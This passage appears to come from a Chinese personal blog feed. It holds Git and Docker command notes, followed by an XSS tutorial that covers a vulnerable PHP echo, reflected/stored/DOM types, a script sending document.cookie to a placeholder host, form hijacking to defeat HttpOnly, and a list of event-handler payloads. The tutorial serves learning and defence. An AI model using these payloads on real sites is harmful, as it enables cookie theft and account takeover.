class="line"></span><br><span class="line"># 改名文件，并且将这个改名放入暂存区</span><br><span class="line">$ git mv [file-original] [file-renamed]</span><br></pre></td></tr></table></figure></div><p>代码提交：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 提交暂存区到仓库区</span><br><span class="line">$ git commit -m [message]</span><br><span class="line"></span><br><span class="line"># 提交暂存区的指定文件到仓库区</span><br><span class="line">$ git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"># 提交工作区自上次commit之后的变化，直接到仓库区</span><br><span class="line">$ git commit -a</span><br><span class="line"></span><br><span class="line"># 提交时显示所有diff信息</span><br><span class="line">$ git commit -v</span><br><span class="line"></span><br><span class="line"># 使用一次新的commit，替代上一次提交</span><br><span class="line"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br><span class="line">$ git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"># 重做上一次commit，并包括指定文件的新变化</span><br><span class="line">$ git commit --amend [file1] [file2] ...</span><br></pre></td></tr></table></figure></div><p>更多指令和插件下载 &lt;<a class="link" href="https://gitee.com/all-about-git">Git 大全 - Gitee.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>&gt;</p><blockquote><p>标签</p><p>查看信息</p><p>远程同步</p><p>撤销</p></blockquote><h2 id="git分支"><a class="markdownIt-Anchor" href="#git分支">#</a> Git 分支</h2><p><img lazyload src="/images/loading.svg" data-src="C:/Users/20957/AppData/Roaming/Typora/typora-user-images/image-20240416113826761.png" alt="image-20240416113826761"></p><p>我曾在搭建这个博客时遇到了关于分支的很大的问题，github 更改过一次分支，将 master 改为了 main，但是我本地依旧是 master，就需要更改分支</p><h3 id="分支的指令"><a class="markdownIt-Anchor" href="#分支的指令">#</a> 分支的指令</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 列出所有本地分支</span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"># 列出所有远程分支</span><br><span class="line">git branch -r</span><br><span class="line"></span><br><span class="line"># 新建一个分支，但依然停留在当前分支</span><br><span class="line">git branch [branch-name]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，并切换到该分支</span><br><span class="line">git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"># 合并指定分支到当前分支</span><br><span class="line">$ git merge [branch]</span><br><span class="line"></span><br><span class="line"># 删除分支</span><br><span class="line">$ git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"># 删除远程分支</span><br><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git branch -dr [remote/branch]</span><br></pre></td></tr></table></figure></div><h1 id="docker"><a class="markdownIt-Anchor" href="#docker">#</a> Docker</h1><p><strong>Docker</strong> 是一个开源的应用容器引擎，基于 Go 语言，并遵从 Apache2.0 协议开源。它可以让开发者将应用程序及其依赖包打包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。<strong>Docker</strong> 可用于开发应用、交付应用和运行应用等场景</p><p>容器技术的起源可以追溯到解决重复搭建环境、浪费时间和效率的问题。在没有容器技术之前，虚拟机是一种常见的解决方案，但它们存在资源占用大、启动时间慢等问题。与虚拟机不同，<strong>Docker</strong> 使用容器隔离应用程序的运行时环境，但容器之间可以共享同一个操作系统。这使得容器更轻量且占用更少资源，且启动速度快。因此，<strong>Docker</strong> 成为了打包服务栈的高效方式</p><p>Docker 的主要用途，目前有三大类。</p><p>**（1）提供一次性的环境。** 比如，本地测试他人的软件、持续集成的时候提供单元测试和构建的环境。</p><p>**（2）提供弹性的云服务。** 因为 Docker 容器可以随开随关，很适合动态扩容和缩容。</p><p>**（3）组建微服务架构。** 通过多个容器，一台机器可以跑多个服务，因此在本机就可以模拟出微服务架构。</p><h2 id="docker命令"><a class="markdownIt-Anchor" href="#docker命令">#</a> Docker 命令</h2><h3 id="基础命令"><a class="markdownIt-Anchor" href="#基础命令">#</a> 基础命令</h3><p>启动 Docker： <code>systemctl start docker</code></p><p>关闭 Docker：  <code>systemctl stop docker</code></p><p>重启 Docker： <code>systemctl restart docker</code></p><p>docker 设置随服务启动而自启动： <code>systemctl enable docker</code></p><p>查看 Docker 运行状态： <code>systemctl status docker</code></p><p>查看 Docker 版本号信息： <code>docker version &amp; docker info</code></p><p>Docker 帮助命令： <code>docker --help</code></p><h3 id="镜像-容器命令"><a class="markdownIt-Anchor" href="#镜像-容器命令">#</a> 镜像 / 容器命令</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/lkoNY3MnVQPK4Hy.jpg" alt="533212df4b4d89ffad49622b744f932.jpg"></p><p><strong>镜像</strong></p><p><code>docker search 镜像id或name</code> ：在 Docker Hub（或其他镜像仓库如阿里镜像）仓库中搜索关键字的镜像</p><p><code>docker pull 镜像id或name</code> ：从仓库中下载镜像，若要指定版本，则要在冒号后指定</p><p><code>docker images</code> ：列出已经下载的镜像，查看镜像</p><p><code>docker rmi 镜像id或name</code> ：删除本地镜像</p><p><code>docker rmi -f 镜像id或name</code> : 删除镜像</p><p><code>docker build</code> ：构建镜像</p><p><code>docker save</code> ：将镜像压缩并保存到本地</p><p><code>docker load</code> ：从本地下载镜像</p><p><strong>容器</strong></p><p><code>docker ps</code> ：列出运行中的容器</p><p><code>docker ps -a</code>  ： 查看所有容器，包括未运行</p><p><code>docker run</code> ：启动容器</p><p><code>docker stop 容器id或name</code> ：停止容器</p><p><code>docker kill 容器id</code> ：强制停止容器</p><p><code>docker start 容器id或name</code> ：启动已停止的容器</p><p><code>docker inspect 容器id</code> ：查看容器的所有信息</p><p><code>docker container logs 容器id</code> ：查看容器日志</p><p><code>docker top 容器id</code> ：查看容器里的进程</p><p><code>docker exec -it 容器id /bin/bash</code> ：进入容器</p><p><code>exit</code> ：退出容器</p><p><code>docker rm 容器id或name</code> ：删除已停止的容器</p><p><code>docker rm -f 容器id</code> ：删除正在运行的容器</p><p><code>docker exec -it 容器ID sh </code> : 进入容器</p><h2 id="数据卷"><a class="markdownIt-Anchor" href="#数据卷">#</a> 数据卷</h2><p><strong>数据卷</strong>（volume）是一个虚拟目录，是容器内目录与宿主机目录之间映射的桥梁</p><p>Docker 将运用与运行的环境打包形成容器运行， Docker 容器产生的数据，如果不通过 docker commit 生成新的镜像，使得数据做为镜像的一部分保存下来， 那么当容器删除后，数据自然也就没有了。 为了能保存数据在 Docker 中我们使用卷。|</p><p>卷就是目录或文件，存在于一个或多个容器中，由 Docker 挂载到容器，但卷不属于联合文件系统（Union FileSystem），因此能够绕过联合文件系统提供一些用于持续存储或共享数据的特性:。</p><p>卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此 Docker 不会在容器删除时删除其挂载的数据卷。</p><p>数据卷的特点:</p><p>1. 数据卷可在容器之间共享或重用数据<br> 2. 卷中的更改可以直接生效<br> 3. 数据卷中的更改不会包含在镜像的更新中<br> 4. 数据卷的生命周期一直持续到没有容器使用它为止</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/XQzpv3Wh8VP1owE.jpg" alt="9adc1f8d4b0224fc8531ae9cc96249a.jpg"></p><p>在宿主机 / 容器中的更改会同步到另一方</p><h3 id="命令"><a class="markdownIt-Anchor" href="#命令">#</a> 命令</h3><p>创建数据卷： <code>docker volume create my-vol</code></p><p>查看所有数据卷： <code>docker volume ls</code></p><p>删除数据卷： <code>docker volume rm</code></p><p>查看某个数据卷的详情： <code>docker volume inspect</code></p><p>清除数据卷： <code>docker volume prune</code></p><h2 id="image文件"><a class="markdownIt-Anchor" href="#image文件">#</a> image 文件</h2><p>**Docker 把应用程序及其依赖，打包在 image 文件里面。** 只有通过这个文件，才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。</p><p>image 是二进制文件。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。</p><p>image 文件是通用的，一台机器的 image 文件拷贝到另一台机器，照样可以使用。一般来说，为了节省时间，我们应该尽量使用别人制作好的 image 文件，而不是自己制作。即使要定制，也应该基于别人的 image 文件进行加工，而不是从零开始制作。</p><p>为了方便共享，image 文件制作完成后，可以上传到网上的仓库。Docker 的官方仓库 <a class="link" href="https://hub.docker.com/">Docker Hub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是最重要、最常用的 image 仓库。</p><h2 id="dockerfile"><a class="markdownIt-Anchor" href="#dockerfile">#</a> Dockerfile</h2><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。</p><h3 id="定制镜像"><a class="markdownIt-Anchor" href="#定制镜像">#</a> 定制镜像</h3><p>构建镜像：  <code>docker build -t 镜像名 Dockerfile目录（如是当前所在目录，可用‘.’</code></p><p>镜像的定制实际上就是定制每一层所添加的配置、文件。如果我们可以把每一层修改、安装、构建、操作的命令都写入一个脚本，用这个脚本来构建、定制镜像，无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决。这个脚本就是  <code>Dockerfile</code> 。</p><p><code>Dockerfile</code>  是一个文本文件，其内包含了一条条的指令 (Instruction)，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。</p><p>以  <code>nginx</code>  镜像为例，这次我们使用  <code>Dockerfile</code>  来定制。</p><p>在一个空白目录中，建立一个文本文件，并命名为  <code>Dockerfile</code> ：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir mynginx</span><br><span class="line">$ cd mynginx</span><br><span class="line">$ touch Dockerfile</span><br></pre></td></tr></table></figure></div><p>其内容为：</p><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM nginx</span><br><span class="line">RUN echo &#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27; &gt; /usr/share/nginx/html/index.html</span><br></pre></td></tr></table></figure></div><p>这个  <code>Dockerfile</code>  很简单，一共就两行。涉及到了两条指令， <code>FROM</code>  和  <code>RUN</code> 。</p><h4 id="from-指定基础镜像"><a class="markdownIt-Anchor" href="#from-指定基础镜像">#</a> <strong>FROM 指定基础镜像</strong></h4><p>所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。就像我们之前运行了一个  <code>nginx</code>  镜像的容器，再进行修改一样，基础镜像是必须指定的。而  <code>FROM</code>  就是指定<strong>基础镜像</strong>，因此一个  <code>Dockerfile</code>  中  <code>FROM</code>  是必备的指令，并且必须是第一条指令。</p><p>在  <code>Docker Store</code>  上有非常多的高质量的官方镜像，有可以直接拿来使用的服务类的镜像，如  <code>nginx</code> 、 <code>redis</code> 、 <code>mongo</code> 、 <code>mysql</code> 、 <code>httpd</code> 、 <code>php</code> 、 <code>tomcat</code>  等；也有一些方便开发、构建、运行各种语言应用的镜像，如 <code>node</code> 、 <code>openjdk</code> 、 <code>python</code> 、 <code>ruby</code> 、 <code>golang</code>  等。可以在其中寻找一个最符合我们最终目标的镜像为基础镜像进行定制。</p><p>如果没有找到对应服务的镜像，官方镜像中还提供了一些更为基础的操作系统镜像，如 <code>ubuntu</code> 、 <code>debian</code> 、 <code>centos</code> 、 <code>fedora</code> 、 <code>alpine</code>  等，这些操作系统的软件库为我们提供了更广阔的扩展空间。</p><p>除了选择现有镜像为基础镜像外， <code>Docker</code>  还存在一个特殊的镜像，名为  <code>scratch</code> 。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。</p><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM scratch</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><blockquote><p>如果你以  <code>scratch</code>  为基础镜像的话，意味着你不以任何镜像为基础，接下来所写的指令将作为镜像第一层开始存在。</p></blockquote><p>不以任何系统为基础，直接将可执行文件复制进镜像的做法并不罕见，比如 <code>swarm</code> 、 <code>coreos/etcd</code> 。对于 Linux 下静态编译的程序来说，并不需要有操作系统提供运行时支持，所需的一切库都已经在可执行文件里了，因此直接  <code>FROM scratch</code>  会让镜像体积更加小巧。使用 Go 语言开发的应用很多会使用这种方式来制作镜像，这也是为什么有人认为  <code>Go</code>  是特别适合容器微服务架构的语言的原因之一。</p><h4 id="run-执行命令"><a class="markdownIt-Anchor" href="#run-执行命令">#</a> <strong>RUN 执行命令</strong></h4><p><code>RUN</code>  指令是用来执行命令行命令的。由于命令行的强大能力， <code>RUN</code>  指令在定制镜像时是最常用的指令之一。其格式有两种：</p><ul><li>*<strong>shell* 格式： <code>RUN &lt;命令&gt;</code> ，就像直接在命令行中输入的命令一样。刚才写的  <code>Dockerfile</code>  中的  <code>RUN</code>  指令就是这种格式。</strong></li></ul><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN echo &#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27; &gt; /usr/share/nginx/html/index.html</span><br></pre></td></tr></table></figure></div><ul><li>*<strong>exec* 格式： <code>RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;]</code> ，这更像是函数调用中的格式。</strong></li></ul><h4 id="其他指令"><a class="markdownIt-Anchor" href="#其他指令">#</a> <strong>其他指令</strong>：</h4><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/Hy4g3sq6nkEbLmQ.png" alt="image.png"></p><h2 id="docker全流程"><a class="markdownIt-Anchor" href="#docker全流程">#</a> Docker 全流程</h2><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/17/yZoqipkB.png" alt="20200927104919216.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;git&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#git&quot;&gt;#&lt;/a&gt; Git&lt;/h1&gt;
&lt;h2 id=&quot;版本控制&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#版本控制&quot;&gt;#&lt;/a&gt; 版本控制&lt;/h2&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="http://example.com/2024/04/15/XSS/"/>
    <id>http://example.com/2024/04/15/XSS/</id>
    <published>2024-04-15T11:22:43.000Z</published>
    <updated>2024-04-15T15:33:48.950Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss"><a class="markdownIt-Anchor" href="#xss">#</a> XSS</h1><h2 id="跨站脚本攻击"><a class="markdownIt-Anchor" href="#跨站脚本攻击">#</a> 跨站脚本攻击</h2><p>网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web 应用程序能够输出相应的内容。动态站点会受到一种名为 “跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成 XSS, 原本应当是 css，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区分，故称 XSS，而静态站点则完全不受其影响。XSS 的运行原理是将恶意的 script 脚本插入进 html/css/js 文件当中，恶意攻击者会在 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。</p><p>跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用 xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和 cookie 等各种内容</p><p>攻击者利用 XSS 漏洞旁路掉访问控制 —— 例如同源策略 (same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼 (Phishing) 攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的 “缓冲区溢出攻击”，而 JavaScript 是新型的 “ShellCode”。</p><p>xss 漏洞通常是通过 php 的输出函数将 javascript 代码输出到 html 页面中，通过用户本地浏览器执行的，所以 xss 漏洞关键就是<strong>寻找参数未过滤的输出函数。</strong></p><p>例如以下代码：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>代码未对可控制参数做任何过滤，此时就可以利用 x 构建恶意 js 代码获取一定的信息，测试一下 <code>?x=&lt;script&gt;alert(1)&lt;script&gt;</code></p><p>此时是页面会弹出 <code>1</code> ：</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/sXjQ6w35zbWBAut.png" alt="image.png"></p><p>xss 漏洞一般是在前端，对用户输入的内容缺少过滤，当用户构造恶意的 script 语句时，就有可能泄露信息，用户可以利用 php 中的输出函数（常见的输出函数有： <code>print</code> 、 <code>print_r</code> 、 <code>echo</code> 、 <code>printf</code> 、 <code>sprintf</code> 、 <code>die</code> 、 <code>var_dump</code> 、 <code>var_export</code> ）来获取敏感信息</p><p>危害影响：</p><blockquote><ul><li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li><li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li><li>盗窃企业重要的具有商业价值的资料</li><li>非法转账</li><li>强制发送电子邮件</li><li>网站挂马</li><li>控制受害者机器向其它网站发起攻击</li></ul></blockquote><p>其实归根结底，XSS 的攻击方式就是想办法 “教唆” 用户的浏览器去执行一些这个网页中原本不存在的前端代码。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在 XSS 中除非恶作剧，不然是不会在恶意植入代码中写上 alert (“say something”) 的。在真正的应用中，XSS 攻击可以干的事情还有很多</p><p><strong>1. 窃取网页浏览中的 cookie 值</strong></p><p>在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个 cookie 值。这个 cookie 值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的 cookie 值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过 script 脚本获得当前页面的 cookie 值，通常会用到 cookie</p><p><strong>2. 劫持流量实现恶意跳转</strong></p><p>这个很简单，就是在网页中想办法插入一句像这样的语句： <script>window.location.href=“<a class="link"   href="http://www.baidu.com" >http://www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>”;</script>那么所访问的网站就会被跳转到百度的首页。早在 2011 年新浪就曾爆出过严重的 xss 漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。</p><p>常出现场景：文章发表、评论、留言、注册资料的地方、修改资料的地方等</p><p>XSS 可以分为反射型、存储型、DOM 型</p><h3 id="反射型xss"><a class="markdownIt-Anchor" href="#反射型xss">#</a> 反射型 XSS</h3><p>非持久化</p><p>（1）原理<br>  反射型 xss 又称非持久型 xss，是目前最普遍的类型，这种攻击方式往往具有一次性，危害相对较小，但是方便攻击者构造。发出请求时，XSS 代码出现在 URL 中，作为输入提交到服务器端，服务器端解析后响应，XSS 代码随响应内容一起传回给浏览器，最后浏览器解析执行 XSS 代码。这个过程像一次反射，所以称反射型 XSS。</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/HRqcBeglPQzE4hF.png" alt="image.png"></p><p>（2）攻击方式<br>  攻击者通过电子邮件等方式将包含 xss 代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有 xss 代码的数据发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后就会触发 xss 漏洞</p><p>在判断是否有能利用的 XSS 时，一般需要判断网站过滤了什么字符，然后进行代码注入：<br>面对输入框，先输入 <code>1</code> :</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/JTeYCBVtnUSkmau.png" alt="image.png"></p><p>然后查看源代码，找到输入的 <code>1</code>  出现在什么地方：<br><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/FkWQ7DNZUM1KVHA.png" alt="image.png"></p><p>插入代码： <code>&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/xBlZRjIoMrLXdSp.png" alt="image.png"></p><p>注入成功；</p><p><code>&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code>  中 <code>&quot;&gt;</code>  闭合了前面的语句，后面 <code>&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code>  是实际利用漏洞达到目的的语句</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/Djbq3zoIdWvgwyY.png" alt="image.png"></p><h3 id="存储型xss"><a class="markdownIt-Anchor" href="#存储型xss">#</a> 存储型 XSS</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/v8CzH1lJwTtGfe7.png" alt="image.png"></p><p>（1）原理<br>  存储型 XSS 和反射型 XSS 的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交 XSS 代码，会长期存在并有效。最典型的例子就是留言板 XSS，用户提交一条包含 XSS 代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了 XSS 攻击</p><p>（2）攻击方式<br>  这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行</p><h3 id="dom型xss"><a class="markdownIt-Anchor" href="#dom型xss">#</a> DOM 型 XSS</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/djA6KrPy3e4OtcU.png" alt="image.png"></p><p>（1）原理<br>  文档对象模型 Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分</p><p>DOM 型 xss 其实是一种特殊类型的反射型 xss，也被称作本地跨站，它是基于 DOM 文档对象模型的一种漏洞。DOM XSS 和反射型 XSS、存储型 XSS 的区别在于 DOM XSS 代码并不需要服务器参与，出发 XSS 靠的是浏览器的 DOM 解析，完全是客户端的事情</p><p>DOM 中有很多对象，其中一些对象可以被用户所操纵，如 url，location 等。客户端的脚本程序可以通过 DOM 来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得 DOM 中的数据后并在本地执行，因此仅从服务器端是没有办法防御 DOM 型 XSS 漏洞的，如若 DOM 中的数据没有经过严格的验证，便会产生基于 DOM 的 XSS 漏洞。</p><p>基于 DOM 的 XSS 是反射的特例，其中 JavaScript 隐藏在 URL 中，并在其呈现时由页面中的 JavaScript 取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的 WAF 或其他防护检测不出恶意内容。</p><p>（2）攻击方式<br>  用户请求一个经过专门设计的 URL，它由攻击者提交，而且其中包含 xss 代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM 对象就会处理 xss 代码，导致存在 xss 漏洞</p><h3 id="使用js代码获取cookie"><a class="markdownIt-Anchor" href="#使用js代码获取cookie">#</a> 使用 JS 代码获取 Cookie</h3><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> img=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);img.<span class="property">src</span>=<span class="string">&quot;http://xxxx/a?&quot;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;script&gt;</span><br></pre></td></tr></table></figure></div><h3 id="获取session"><a class="markdownIt-Anchor" href="#获取session">#</a> 获取 session</h3><p>有的时候获取了 Cookie，但是少了 Session，会造成登不进后台，服务器开启了 Session 验证的话，我们只获取客户端的 Cookie 是没有办法通过验证的，而且我们也无法获取存放在服务端的 Session。如果需要获取 Session，可以借助辅助文件，比如访问 php 探针时就会携带 Session</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/yRmvSg7rsHIXkQh.png" alt="image.png"></p><p>想办法进入 phpinfo ()</p><p>利用 beef 进行页面跳转</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/UZmWoGfNuz64Sxd.png" alt="image.png"></p><p>获取页面源码</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/jcwyR6NYOaZg7ld.png" alt="image.png"></p><h3 id="httponly"><a class="markdownIt-Anchor" href="#httponly">#</a> HttpOnly</h3><p>如果 Cookie 中设置了 HttpOnly 属性，那么通过 JS 脚本将无法读取到 Cookie 信息，这样能有效防止 XSS 攻击，窃取 Cookie 内容。 但是还是存在 xss 跨站语句，阻止的仅仅是获取 cookie</p><p>各种主流语言都支持 HttpOnly</p><h3 id="反制httponly"><a class="markdownIt-Anchor" href="#反制httponly">#</a> 反制 HttpOnly</h3><p>当对方开启 HttpOnly 时，盗取 cookie 就会失败。登录后台的方式有 Cookie 登录和账号密码登录</p><p>（1）Cookie 形式<br>（2）直接账号密码登录</p><p>① 读取保存账号密码<br>  通过窃取保存在本地的数据（账号密码）来登录后台（需要 xss 产生于登录地址，利用表单劫持）</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/gBu43eYEGRdqSVX.png" alt="image.png"></p><p>type、id、name 通过查看网站源代码中的登录框表单</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/hk6GDgcZiR5MU49.png" alt="image.png"></p><p>② 读取没保存账号密码</p><p>通过表单（登录框）劫持数据（产生在后台的 XSS，例如存储型 XSS 留言等）</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/Csrn7KIPulTvi5M.png" alt="image.png"></p><p>劫持原理：抓取数据包另外发送一份到跨站平台</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/ELwHWCM3kAbQiTl.png" alt="image.png"></p><p>但是如果是 https 网站的话，数据是进行了 ssl 加密，获取了数据之后也是很难读取到账号密码的，鸡肋方法</p><h2 id="一些常见标签"><a class="markdownIt-Anchor" href="#一些常见标签">#</a> 一些常见标签</h2><p><code>&lt;script&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;img&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">XSS</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;input&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#竞争焦点，从而触发onblur事件</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;) <span 